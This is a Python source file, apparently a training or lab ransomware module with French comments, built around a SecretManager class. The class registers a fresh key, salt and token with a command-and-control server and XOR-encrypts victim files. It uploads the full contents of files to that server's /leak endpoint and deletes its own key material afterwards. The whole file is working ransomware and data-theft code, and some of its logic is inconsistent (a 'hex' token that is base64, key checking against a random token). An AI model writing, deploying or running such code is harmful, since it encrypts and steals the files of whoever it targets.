from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
            
        )
        return kdf.derive(key)


    def create(self)->Tuple[bytes, bytes, bytes]:
        self._salt = os.urandom(self.SALT_LENGTH)
        self._key = secrets.token_bytes(self.KEY_LENGTH)
        self._token = os.urandom(self.TOKEN_LENGTH)
        return self._salt, self._key, self._token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")
    
    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
        # Création de l'URL de destination
        # Et encodage des données
        data = {
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key),
            "token": self.bin_to_b64(token),
        }
        requests.post(f"http://{self._remote_host_port}/register", json=data)


    def setup(self) -> None:
       #Fonction permettant de créer des données cryptographiques et enregistrer le malware dans le cnc
       # Créer les éléments : sel, clé et jeton
        self.create()
        self.post_new(self._salt, self._key, self._token)


    def load(self) -> None:
        # Fonction pour charger les données cryptographiques
        salt_path = os.path.join(self._path, "salt.bin")
        token_path = os.path.join(self._path, "token.bin")

        # Vérifie l'existence des fichiers de sel et de token
        if os.path.exists(salt_path) and os.path.exists(token_path):
            with open(salt_path, "rb") as salt_f:
                self._salt = salt_f.read()
            with open(token_path, "rb") as token_f:
                self._token = token_f.read()
            # Affiche un message de confirmation
            self._log.info("charger les données sel et de token")
        else:
            # Affiche un message d'erreur au cas contraire
            self._log.error("Les fichiers de sel ou de token n'existe pas") 


    def check_key(self, candidate_key: bytes) -> bool:
        # Vérifie si la clé candidate est valide
        token = self.do_derivation(self._salt, candidate_key)

        # vérifier si la clé est valide
        if token == self._token:
            return True
        else:
            return False


    def set_key(self, b64_key: str) -> None:
        # Décode la clé en base64 et la teste
        decoded_key = base64.b64decode(b64_key)
        if self.check_key(decoded_key):
            self._key = decoded_key
            self._log.info("Clé Acceptée")
        else:
            self._log.error("Clé Refusée")


    
    def get_hex_token(self)->str:
        # Devrait retourner une chaîne de caractères composée de symboles hexadécimaux, en ce qui concerne le token
        return self.bin_to_b64(self._token)

    def xorfiles(self, files:List[str])->None:
        # Effectuer un XOR sur une liste pour un fichier.
        for file_path in files:
            try:
                xorfile(file_path, self._key)
            except Exception as e:
                self._log.error(f"Error encrypting file {file_path}: {e}")

    def leak_files(self, files:List[str])->None:
        # On doit envoyer le fichier, le chemin authentique et le token au cnc
        url = f"http://{self._remote_host_port}/leak"
        for file in files:
            with open(file, "rb") as f:
                content = f.read()
            b64_content = self.bin_to_b64(content)
            data = {
                "token": self.bin_to_b64(self._token),
                "path": file,
                "content": b64_content
            }
            response = requests.post(url, json=data)
            response.raise_for_status()


    def clean(self) -> None:
        # Supprimer les fichiers de cryptographie locaux
        salt_file = os.path.join(self._path, "salt.bin")
        token_file = os.path.join(self._path, "token.bin")

        try:
            if os.path.exists(salt_file):
                os.remove(salt_file)
                self._log.info("fichier Salt effacé")

            if os.path.exists(token_file):
                os.remove(token_file)
                self._log.info("fichier token effacé")

        except Exception as err:
            self._log.error(f"Erreur lors du 'clean' des fichiers: {err}")
        finally:
            # Effacer les données en mémoire
            self._salt = None
            self._key = None
            self._token = None

